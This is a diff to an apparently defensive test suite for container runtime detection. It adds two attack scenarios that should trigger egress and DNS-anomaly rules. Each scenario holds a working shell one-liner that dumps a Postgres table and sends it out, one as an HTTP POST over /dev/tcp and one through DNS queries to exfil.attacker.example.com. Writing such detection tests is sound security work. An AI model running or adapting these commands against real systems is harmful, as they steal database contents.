@@ -478,3 +478,24 @@ attacks:
     successIndicators: [{ responseContains: "hardlink_done" }]
     expectedDetections:
       - { ruleID: R1012, ruleName: Hard link created over sensitive file, containerName: postgres, command: ln }
+  - name: exfil-http-dbdump
+    type: cmdinject
+    # DB read -> HTTP egress in one action: the SELECT lands in pgsql_events and
+    # the POST body in http_events under one order. Contained: exfil-sink is an
+    # in-cluster nginx (example/postgres/distros/exfil-sink.yaml), plain :80 so
+    # Pixie parses the L7 payload (over TLS only conn_stats is visible).
+    exec:
+      command: ["bash", "-c", "export PGPASSWORD=bobtest; D=$(psql -h postgres -U app -d app -tAc \"SELECT string_agg(key||':'||value, ',') FROM bobtest;\" | base64 -w0); exec 3<>/dev/tcp/exfil-sink.exfil.svc.cluster.local/80; printf 'POST /collect HTTP/1.1\r\nHost: exfil-sink\r\nContent-Length: %s\r\n\r\n%s' \"${#D}\" \"$D\" >&3; head -1 <&3; echo http_exfil_done"]
+    successIndicators: [{ responseContains: "http_exfil_done" }]
+    expectedDetections:
+      - { ruleID: R0011, ruleName: Unexpected egress network communication, containerName: postgres }
+  - name: exfil-dns-dbdump
+    type: cmdinject
+    # DB read -> DNS egress: the exfiltrated bytes ARE the query name, recoverable
+    # from dns_events.req_body (base64url, 40-char labels < 63B limit). Contained:
+    # the domain never resolves, the lookup itself is the signal.
+    exec:
+      command: ["sh", "-c", "export PGPASSWORD=bobtest; D=$(psql -h postgres -U app -d app -tAc \"SELECT string_agg(key||':'||value, ',') FROM bobtest;\" | base64 -w0 | tr '+/' '-_' | tr -d '=' | head -c 100); i=0; while [ $i -lt ${#D} ]; do getent hosts \"${D:$i:40}.x$i.exfil.attacker.example.com\" >/dev/null 2>&1 || true; i=$((i+40)); done; echo dns_exfil_done"]
+    successIndicators: [{ responseContains: "dns_exfil_done" }]
+    expectedDetections:
+      - { ruleID: R0005, ruleName: DNS Anomalies in container, containerName: postgres }
